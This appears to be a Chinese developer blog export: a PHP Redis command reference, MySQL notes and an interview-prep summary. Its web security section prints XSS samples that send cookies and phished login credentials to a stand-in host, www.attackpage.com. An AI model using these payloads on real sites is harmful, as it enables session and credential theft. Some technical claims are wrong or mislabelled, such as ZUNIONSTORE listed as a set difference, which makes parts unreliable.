class="line"><span class="variable">$redis</span>-&gt;append(<span class="string">'key'</span>, <span class="string">'string'</span>);  //把string追加到key现有的value中[追加后的个数]</span><br><span class="line"><span class="variable">$redis</span>-&gt;incr(<span class="string">'key'</span>);  //自增1，如不存在key, 赋值为1(只对整数有效, 存储以10进制64位，redis中为str)[new_num | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;incrby(<span class="string">'key'</span>, <span class="variable">$num</span>);  //自增<span class="variable">$num</span>, 不存在为赋值, 值需为整数[new_num | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;decr(<span class="string">'key'</span>);  //自减1，[new_num | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;decrby(<span class="string">'key'</span>, <span class="variable">$num</span>);  //自减<span class="variable">$num</span>，[ new_num | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;setex(<span class="string">'key'</span>, 10, <span class="string">'value'</span>);  //key=value，有效期为10秒[<span class="literal">true</span>]</span><br><span class="line">//list</span><br><span class="line"><span class="variable">$redis</span>-&gt;llen(<span class="string">'key'</span>);  //返回列表key的长度, 不存在key返回0， [ len | 0]</span><br><span class="line">//<span class="built_in">set</span></span><br><span class="line"><span class="variable">$redis</span>-&gt;scard(<span class="string">'key'</span>);  //返回集合key的基数(集合中元素的数量)。[num | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;sMove(<span class="string">'key1'</span>,  <span class="string">'key2'</span>,  <span class="string">'member'</span>);  //移动，将member元素从key1集合移动到key2集合。[1 | 0]</span><br><span class="line">//Zset</span><br><span class="line"><span class="variable">$redis</span>-&gt;zcard(<span class="string">'key'</span>);  //返回集合key的基数(集合中元素的数量)。[num | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zcount(<span class="string">'key'</span>, 0, -1);  //返回有序集key中，score值在min和max之间(默认包括score值等于min或max)的成员。[num | 0]</span><br><span class="line">//<span class="built_in">hash</span></span><br><span class="line"><span class="variable">$redis</span>-&gt;hexists(<span class="string">'key'</span>, <span class="string">'field'</span>);  //查看<span class="built_in">hash</span>中是否存在field, [1 | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hincrby(<span class="string">'key'</span>, <span class="string">'field'</span>, <span class="variable">$int_num</span>);  //为哈希表key中的域field的值加上量(+|-)num, [new_num | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hlen(<span class="string">'key'</span>);  //返回哈希表key中域的数量。[ num | 0]</span><br></pre></td></tr></table></figure><ul><li>事务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;dbSize();  //返回当前库中的key的个数</span><br><span class="line"><span class="variable">$redis</span>-&gt;flushAll();  //清空整个redis[总<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;flushDB();  //清空当前redis库[总<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;save();  //同步 把数据存储到磁盘-dump.rdb[<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;bgsave();  //异步 把数据存储到磁盘-dump.rdb[<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;info();  //查询当前redis的状态 [verson:2.4.5....]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lastSave();  //上次存储时间key的时间[timestamp]</span><br><span class="line"></span><br><span class="line"><span class="variable">$redis</span>-&gt;watch(<span class="string">'key'</span>, <span class="string">'keyn'</span>);  //监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断 [<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;unwatch(<span class="string">'key'</span>, <span class="string">'keyn'</span>);  //取消监视一个(或多个) key [<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;multi(Redis::MULTI);  //开启事务，事务块内的多条命令会按照先后顺序被放进一个队列当中，最后由 EXEC 命令在一个原子时间内执行。</span><br><span class="line"><span class="variable">$redis</span>-&gt;multi(Redis::PIPELINE);  //开启管道，事务块内的多条命令会按照先后顺序被放进一个队列当中，最后由 EXEC 命令在一个原子时间内执行。</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="built_in">exec</span>();  //执行所有事务块内的命令，；【事务块内所有命令的返回值，按命令执行的先后顺序排列，当操作被打断时，返回空值 <span class="literal">false</span>】</span><br></pre></td></tr></table></figure><ul><li><p>数据结构</p><p>String</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;setOption(Redis::OPT_PREFIX, <span class="string">'hf_'</span>);  //设置表前缀为hf_</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="built_in">set</span>(<span class="string">'key'</span>, 1);  //设置key=aa value=1 [<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;mset(<span class="variable">$arr</span>);  //设置一个或多个键值[<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;setnx(<span class="string">'key'</span>, <span class="string">'value'</span>);  //key=value, key存在返回<span class="literal">false</span>[|<span class="literal">true</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;get(<span class="string">'key'</span>);  //获取key [value]</span><br><span class="line"><span class="variable">$redis</span>-&gt;mget(<span class="variable">$arr</span>);  //(string|arr), 返回所查询键的值</span><br><span class="line"><span class="variable">$redis</span>-&gt;del(<span class="variable">$key_arr</span>);  //(string|arr)删除key，支持数组批量删除【返回删除个数】</span><br><span class="line"><span class="variable">$redis</span>-&gt;delete(<span class="variable">$key_str</span>, <span class="variable">$key2</span>, <span class="variable">$key3</span>);  //删除keys, [del_num]</span><br><span class="line"><span class="variable">$redis</span>-&gt;getset(<span class="string">'old_key'</span>, <span class="string">'new_value'</span>);  //先获得key的值，然后重新赋值, [old_value | <span class="literal">false</span>]</span><br></pre></td></tr></table></figure><p>Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;hset(<span class="string">'key'</span>, <span class="string">'field'</span>, <span class="string">'value'</span>);  //增，改，将哈希表key中的域field的值设为value, 不存在创建, 存在就覆盖【1 | 0】</span><br><span class="line"><span class="variable">$redis</span>-&gt;hget(<span class="string">'key'</span>, <span class="string">'field'</span>);  //查，取值【value|<span class="literal">false</span>】</span><br><span class="line"><span class="variable">$arr</span> = array(<span class="string">'one'</span>=&gt;1, 2, 3);<span class="variable">$arr2</span> = array(<span class="string">'one'</span>, 0, 1);</span><br><span class="line"><span class="variable">$redis</span>-&gt;hmset(<span class="string">'key'</span>, <span class="variable">$arr</span>);  //增，改，设置多值<span class="variable">$arr</span>为(索引|关联)数组, <span class="variable">$arr</span>[key]=field,  [ <span class="literal">true</span> ]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hmget(<span class="string">'key'</span>, <span class="variable">$arr2</span>);  //查，获取指定下标的field，[<span class="variable">$arr</span> | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hgetall(<span class="string">'key'</span>);  //查，返回哈希表key中的所有域和值。[当key不存在时，返回一个空表]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hkeys(<span class="string">'key'</span>);  //查，返回哈希表key中的所有域。[当key不存在时，返回一个空表]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hvals(<span class="string">'key'</span>);  //查，返回哈希表key中的所有值。[当key不存在时，返回一个空表]</span><br><span class="line"><span class="variable">$redis</span>-&gt;hdel(<span class="string">'key'</span>, <span class="variable">$arr2</span>);  //删，删除指定下标的field, 不存在的域将被忽略, [num | <span class="literal">false</span>]</span><br></pre></td></tr></table></figure><p>List</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;lpush(<span class="string">'key'</span>, <span class="string">'value'</span>);  //增，只能将一个值value插入到列表key的表头，不存在就创建 [列表的长度 |<span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;rpush(<span class="string">'key'</span>, <span class="string">'value'</span>);  //增，只能将一个值value插入到列表key的表尾 [列表的长度 |<span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lInsert(<span class="string">'key'</span>,  Redis::AFTER,  <span class="string">'value'</span>,  <span class="string">'new_value'</span>);  //增，将值value插入到列表key当中，位于值value之前或之后。[new_len | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lpushx(<span class="string">'key'</span>, <span class="string">'value'</span>);  //增，只能将一个值value插入到列表key的表头，不存在不创建 [列表的长度 |<span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;rpushx(<span class="string">'key'</span>, <span class="string">'value'</span>);  //增，只能将一个值value插入到列表key的表尾，不存在不创建 [列表的长度 |<span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lpop(<span class="string">'key'</span>);  //删，移除并返回列表key的头元素, [被删元素 | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;rpop(<span class="string">'key'</span>);  //删，移除并返回列表key的尾元素, [被删元素 | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lrem(<span class="string">'key'</span>, <span class="string">'value'</span>, 0);  //删，根据参数count的值，移除列表中与参数value相等的元素count=(0|-n表头向尾|+n表尾向头移除n个value)  [被移除的数量 | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;ltrim(<span class="string">'key'</span>, start, end);  //删，列表修剪，保留(start, end)之间的值 [<span class="literal">true</span>|<span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lset(<span class="string">'key'</span>, index, <span class="string">'new_v'</span>);  //改，从表头数，将列表key下标为第index的元素的值为new_v,  [<span class="literal">true</span> | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lindex(<span class="string">'key'</span>, index);  //查，返回列表key中，下标为index的元素[value|<span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;lrange(<span class="string">'key'</span>, 0, -1);  //查，(start, stop|0, -1)返回列表key中指定区间内的元素，区间以偏移量start和stop指定。[array|<span class="literal">false</span>]</span><br></pre></td></tr></table></figure><p>Set</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;sadd(<span class="string">'key'</span>, <span class="string">'value1'</span>, <span class="string">'value2'</span>, <span class="string">'valuen'</span>);  //增，改，将一个或多个member元素加入到集合key当中，已经存在于集合的member元素将被忽略。[insert_num]</span><br><span class="line"><span class="variable">$redis</span>-&gt;srem(<span class="string">'key'</span>, <span class="string">'value1'</span>, <span class="string">'value2'</span>, <span class="string">'valuen'</span>);  //删，移除集合key中的一个或多个member元素，不存在的member元素会被忽略 [del_num | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;smembers(<span class="string">'key'</span>);  //查，返回集合key中的所有成员 [array | <span class="string">''</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;sismember(<span class="string">'key'</span>, <span class="string">'member'</span>);  //判断member元素是否是集合key的成员 [1 | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;spop(<span class="string">'key'</span>);  //删，移除并返回集合中的一个随机元素 [member | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;srandmember(<span class="string">'key'</span>);  //查，返回集合中的一个随机元素 [member | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;sinter(<span class="string">'key1'</span>, <span class="string">'key2'</span>, <span class="string">'keyn'</span>);  //查，返回所有给定集合的交集 [array | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;sunion(<span class="string">'key1'</span>, <span class="string">'key2'</span>, <span class="string">'keyn'</span>);  //查，返回所有给定集合的并集 [array | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;sdiff(<span class="string">'key1'</span>, <span class="string">'key2'</span>, <span class="string">'keyn'</span>);  //查，返回所有给定集合的差集 [array | <span class="literal">false</span>]</span><br></pre></td></tr></table></figure><p>Zset</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;zAdd(<span class="string">'key'</span>, <span class="variable">$score1</span>, <span class="variable">$member1</span>, <span class="variable">$scoreN</span>, <span class="variable">$memberN</span>);  //增，改，将一个或多个member元素及其score值加入到有序集key当中。[num | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrem(<span class="string">'key'</span>, <span class="string">'member1'</span>, <span class="string">'membern'</span>);  //删，移除有序集key中的一个或多个成员，不存在的成员将被忽略。[del_num | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zscore(<span class="string">'key'</span>, <span class="string">'member'</span>);  //查, 通过值反拿权 [num | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrange(<span class="string">'key'</span>, <span class="variable">$start</span>, <span class="variable">$stop</span>);  //查，通过(score从小到大)【排序名次范围】拿member值，返回有序集key中，【指定区间内】的成员 [array | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrevrange(<span class="string">'key'</span>, <span class="variable">$start</span>, <span class="variable">$stop</span>);  //查，通过(score从大到小)【排序名次范围】拿member值，返回有序集key中，【指定区间内】的成员 [array | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrangebyscore(<span class="string">'key'</span>, <span class="variable">$min</span>, <span class="variable">$max</span>[, <span class="variable">$config</span>]);  //查，通过scroe权范围拿member值，返回有序集key中，指定区间内的(从小到大排)成员[array | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrevrangebyscore(<span class="string">'key'</span>, <span class="variable">$max</span>, <span class="variable">$min</span>[, <span class="variable">$config</span>]);  //查，通过scroe权范围拿member值，返回有序集key中，指定区间内的(从大到小排)成员[array | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrank(<span class="string">'key'</span>, <span class="string">'member'</span>);  //查，通过member值查(score从小到大)排名结果中的【member排序名次】[order | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;zrevrank(<span class="string">'key'</span>, <span class="string">'member'</span>);  //查，通过member值查(score从大到小)排名结果中的【member排序名次】[order | null]</span><br><span class="line"><span class="variable">$redis</span>-&gt;ZINTERSTORE();  //交集</span><br><span class="line"><span class="variable">$redis</span>-&gt;ZUNIONSTORE();  //差集</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MySQL相关</title>
      <link href="/MySQL.html"/>
      <url>/MySQL.html</url>
      <content type="html"><![CDATA[<p>我也不知道，就写写吧</p><ul><li>int（10）与int（11）的区别</li></ul><p>MySQL类型关键字后面的括号内指定整数值的显示宽度(例如，INT(11))。该可选显示宽度规定用于显示宽度小于指定的列宽度的值时从左侧填满宽度。显示宽度并不限制可以在列内保存的值的范围，也不限制超过列的指定宽度的值的显示。<br>所以INT(10)和INT(11)默认是没有任何区别的</p><ul><li>char与varchar的区别 </li></ul><p>char是一种固定长度的类型，varchar则是一种可变长度的类型char(M)类型的数据列里，每个值都占用M个字节，如果某个长度小于M，MySQL就会在它的右边用空格字符补足.在检索操作中那些填补出来的空格字符将被去掉）在varchar(M)类型的数据列里，每个值只占用刚好够用的字节再加上一个用来记录其长度的字节（即总长度为L+1字节）</p><ul><li>MySQL主从数据库同步</li></ul><ol><li>原理<br> 谈到MySQL数据库主从同步延迟原理，得从mysql的数据库主从复制原理说起<br>mysql的主从复制都是单线程的操作，主库对所有DDL和DML产生binlog，binlog是顺序写，<br>所以效率很高，slave的Slave_IO_Running线程到主库取日志，效率很比较高<br>问题来了，slave的Slave_SQL_Running线程将主库的DDL和DML操作在slave实施。<br>DML和DDL的IO操作是随即的，不是顺序的，成本高很多，还可能可slave上的其他查询产生lock争用，<br>由于Slave_SQL_Running也是单线程的，所以一个DDL卡主了，需要执行10分钟，那么所有之后的DDL会等待这个DDL执行完才会继续执行，这就导致了延时。</li></ol><p>当主库的TPS并发较高时，产生的DDL数量超过slave一个sql线程所能承受的范围，那么延时就产生了，<br>当然还有就是可能与slave的大型query语句产生了锁等待。</p><ol start="2"><li>解决方案<br> 最简单的减少slave同步延时的方案就是在架构上做优化，尽量让主库的DDL快速执行。<br>还有就是主库是写，对数据安全性较高，比如sync_binlog=1，innodb_flush_log_at_trx_commit = 1 之类的设置，而slave则不需要这么高的数据安全，完全可以讲sync_binlog设置为0或者关闭binlog，innodb_flushlog也可以设置为0来提高sql的执行效率。另外就是使用比主库更好的硬件设备作为slave。</li></ol>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>总结</title>
      <link href="/%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93.html"/>
      <url>/%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<h3 id="谈谈理想"><a href="#谈谈理想" class="headerlink" title="谈谈理想"></a>谈谈理想</h3><p>现在经常问到问题比较细也比较小偏，类似高并发，数据库分表分库类似，略微偏运维<br>有时候回反问你们高并发多少，他们也会不好意思说业务量没上来，<br>而据我所知，高并发在1000左右，公司规模就相对比较大了，至少是那些大家都熟知的上市公司<br>有时候现实就这样，不说了，生活要紧</p><h3 id="技术知识"><a href="#技术知识" class="headerlink" title="技术知识"></a>技术知识</h3><ul><li>Nginx+Php-fpm运行原理详解<pre><code>[友情链接](https://segmentfault.com/a/1190000007322358)</code></pre></li><li>Nginx 和 Apache 各有什么优缺点<pre><code>[友情链接](https://www.zhihu.com/question/19571087)</code></pre></li><li>php放注入<pre><code>[友情链接](http://www.cnblogs.com/gaf617/p/6149020.html)</code></pre></li><li>mysql索引讲解<br>  <a href="http://www.cnblogs.com/tgycoder/p/5410057.html" target="_blank" rel="noopener">友情链接</a></li></ul><p>###<br>1.性能调优、算法数据机构</p><p>2.高并发下数据安全、接口冪等性、原子性等</p><p>3.分布式下协同、已经锁的处理</p><p>4.数据库的分库分表、项目之间的垂直拆分</p><p>出现频率高的技术点有：</p><p>1.HashMap</p><p>2.JVM</p><p>3.Dubbo</p><p>4.Mybatis</p><p>5.Zookeeper</p><p>6.http tcp/ip</p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>1.选择适当的字段类型，特别是主键,如：<br>    保小不保大,datetime和timestamp，datetime占用8个字节，<br>    而timestamp占用4 个字节，只用了一半，而timestamp表示的范围是1970—2037，对于大多数应用绰绰有余啊。<br>    导致引擎放弃使用索引而进行全表扫描:<br>    最好不要给数据库留NULL，尽可能的使用 NOT NULL填充数据库<br>    对于连续的数值，能用 between 就不要用 in，in 和 not in 也要慎用，否则会导致全表扫描<br>    应尽量避免在 where 子句中使用 != 或 &lt;&gt; 操作符<br>    应尽量避免在 where 子句中使用 or 来连接条件，如果一个字段有索引，一个字段没有索引，将导致引擎放弃使用索引而进行全表扫描，可以用union all<br>    应尽量避免在 where 子句中对字段进行表达式操作<br>    应尽量避免在 where 子句中对字段进行函数操作<br>    不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引<br>    尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些<br>    mysql会一直向右匹配直到遇到范围查询(&gt;、&lt;、between、like)就停止匹配</p><p>2.适当建立索引<br>    InnoDB就是使用的B+Tree<br>    较频繁的作为查询条件字段应该创建索引<br>    唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件<br>    更新非常频繁的字段不适合创建索引<br>    <a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" target="_blank" rel="noopener">索引原理</a><br>3.对表进行水平划分<br>4.读写分离</p><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p>String——字符串<br>    key-value:除了提供与 Memcached 一样的 get、set、incr、decr 等操作外，Redis 还提供了下面一些操作LEN获取字符串长度,原子计数器,GETSET 命令的妙用，请于清空旧值的同时设置一个新值，配合原子计数器使用;<br>Hash——字典<br>    购物车列表<br>    JSON 用户数据(用户的昵称、年龄、性别、积分);<br>List——列表<br>    轻松地实现最新消息排行<br>    消息队列<br>Set——集合<br>    共同关注、共同喜好、二度好友,求交集、并集、差集<br>Sorted Set——有序集合<br>    带有权重的元素，比如一个游戏的用户得分排行榜,集合中的元素能够按 score 进行有序排列</p><h3 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h3><p>php防sql攻击<br>    办法：</p><pre><code>stripslashes()函数过滤用户输入mysql_real_escape_string将 string 中的特殊字符转义，过滤（\x00,\n,\r,\,‘,“,\x1a），因此可以安全用于 mysql_query()</code></pre><p>XSS</p><pre><code>1. 盗取cookie通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.replace(<span class="string">"http://www.attackpage.com/record.asp?secret="</span>+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><pre><code>2. 钓鱼攻击</code></pre><p>　所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">function</span> <span class="function"><span class="title">hack</span></span>()&#123; </span><br><span class="line">　　　　location.replace(<span class="string">"http://www.attackpage.com/record.asp?username="</span>+document.forms[0].user.value + <span class="string">"password="</span> + document.forms[0].pass.value);</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　&lt;/script&gt;</span><br><span class="line">　　&lt;form&gt;</span><br><span class="line">　　&lt;br&gt; &lt;H3&gt;此功能需要登录:&lt;/H3 &gt; </span><br><span class="line">　　&lt;br&gt;&lt;br&gt;请输入用户名：&lt;br&gt; </span><br><span class="line">　　&lt;input <span class="built_in">type</span>=”text” id=”user”name=”user”&gt;</span><br><span class="line">　　&lt;br&gt;请输入密码：&lt;br&gt;</span><br><span class="line">　　&lt;input <span class="built_in">type</span>=”password” name =“pass”&gt;</span><br><span class="line">　　&lt;br&gt;&lt;input <span class="built_in">type</span>=”submit”name=”login” value=”登录”onclick=”hack()”&gt;</span><br><span class="line">　　&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>它允许恶意web用户将代码植入到提供给其它用户使用的页面中,新浪微博事假</p><p>XSS的预防</p><ol><li><p>输入过滤<br>对用户的所有输入数据进行检测，比如过滤其中的“&lt;”、“&gt;”、“/”等可能导致脚本注入的特殊字符，或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等。同时，我们也要考虑用户可能绕开ASCII码，使用十六进制编码来输入脚本。因此，对用户输入的十六进制编码，我们也要进行相应的过滤。只要能够严格检测每一处交互点，保证对所有用户可能的输入都进行检测和XSS过滤，就能够有效地阻止XSS攻击</p></li><li><p>输出编码<br>通过前面对XSS攻击的分析，我们可以看到，之所以会产生XSS攻击，就是因为Web应用程序将用户的输入直接嵌入到某个页面当中，作为该页面的HTML代码的一部分。因此，当Web应用程序将用户的输入数据输出到目标页面中时，只要用HtmlEncoder等工具先对这些数据进行编码，然后再输出到目标页面中。这样，如果用户输入一些HTML的脚本，也会被当成普通的文字，而不会成为目标页面HTML代码的一部分得到执行。</p></li><li><p>cookie防盗<br>利用XSS攻击，攻击者可以很方便地窃取到合法用户的Cookie信息。因此，对于Cookie，我们可以采取以下的措施。首先，我们要尽可能地避免在Cookie中泄露隐私，如用户名、密码等；其次，我们可以将Cookie信息利用MD5等Hash算法进行多次散列后存放；再次，为了防止重放攻击，我们也可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。</p></li></ol><p>作为一名普通的网络用户，在XSS攻击的预防上我们可以采取以下措施。首先，我们不要轻易相信电子邮件或者网页中的不明链接，这些链接很有可能引导反射型XSS攻击或者使我们访问到一些不安全的网页。其次，我们在不必要的时候可以禁用脚本功能，这样XSS注入的脚本就无法得到运行。</p><p>filter_var,mysql_real_escape_string,htmlentities,htmlspecialchars,strip_tags</p><pre><code>CSRFCSRF就是跨站请求伪造攻击，你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求</code></pre><p>文件上传漏洞<br>    办法：<br>        尽量使用POST，限制GET；浏览器Cookie策略；加验证码；Referer Check在Web最常见的应用就是“防止图片盗链”<br>    使用一个Token，放在用户的Session中，或者浏览器的Cookie中，在页面表单附带上Token参数，Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p><h3 id="Session与Cookie"><a href="#Session与Cookie" class="headerlink" title="Session与Cookie"></a>Session与Cookie</h3><p>Session：在服务器端创建并存放在服务器的内存中的，Session的内容存储是键值对的列表，格式：名称 | 类型：长度：值<br>Session的生命周期：在php.ini中 session.gc_maxlifetime 为session设置了生存时间(默认为1440s) 客户端关闭浏览器，不会影响服务器端对session的存储。</p><p>Cookie：在服务器端创建并写回到客户端浏览器，Cookie是http标头的一部分，浏览器接到响应头中关于写Cookie的指令则在本地临时文件夹中，创建了一个cookie文件，用来保存的Cookie内容。Cookie内容的存储是键值对的方式 。<br>Cookie的生命周期：可以设置过期时间，如果不设置则是会话级别的，即关闭浏览器就会消失。</p><p>原理：<br>PHP默认的Session是基于Cookie的，在此期间首先调用session_start()函数，<br>Session会先判断当前COOKIE[session_name()]是否有值（session_name()返回保存session_id的COOKIE键名）,<br>这个值可以从php.ini找到 session.name = PHPSESSID（默认值PHPSESSID）如果没有值，<br>函数会创建一个唯一的SessionID，<br>同时通过header头（header(‘Set-Cookie: session_name()=session_id(); path=/’)） 将SessionID保存到客户端的Cookie中，并且在服务器端生成Session文件.</p><p>依赖性：<br>PHP 中的Session在默认情况下是使用客户端的Cookie来保存session_id的，所以当客户端的Cookie出问题或者禁用的时候就会影响 Session的使用了。但是Session不一定必须依赖cookie。当客户端的Cookie被禁用或出现问题时，PHP会自动把 session_id附着在url中，这样再通过session_id就能跨页使用Session变量了。这种附着也是有一定条件的，即“php.ini 中的session.use_trans_sid = 1或者编译时打开打开了–enable-trans-sid选项”。但是PHP5只能在Linux平台可以自动检测Cookie的状态而在window 平台上没有此功能</p><h3 id="请求码"><a href="#请求码" class="headerlink" title="请求码"></a>请求码</h3><p>1.1 HTTP协议中几个状态码的含义:503 500 401 403 404 200 301 302。。。<br>200 : 请求成功，请求的数据随之返回。<br>301 : 永久性重定向。<br>302 : 暂时行重定向。<br>401 : 当前请求需要用户验证。<br>403 : 服务器拒绝执行请求，即没有权限。<br>404 : 请求失败，请求的数据在服务器上未发现。<br>500 : 服务器错误。一般服务器端程序执行错误。<br>503 : 服务器临时维护或过载。这个状态时临时性的。</p><h3 id="php基础"><a href="#php基础" class="headerlink" title="php基础"></a>php基础</h3><p>在类内部访问静态成员属性或者方法,使用 self::(注意不是 $slef)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slef:: <span class="variable">$country</span></span><br><span class="line">slef:: myCountry()</span><br></pre></td></tr></table></figure></p><p>子类访问父类静态成员属性或方法,使用 parent::(注意不是 $parent)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 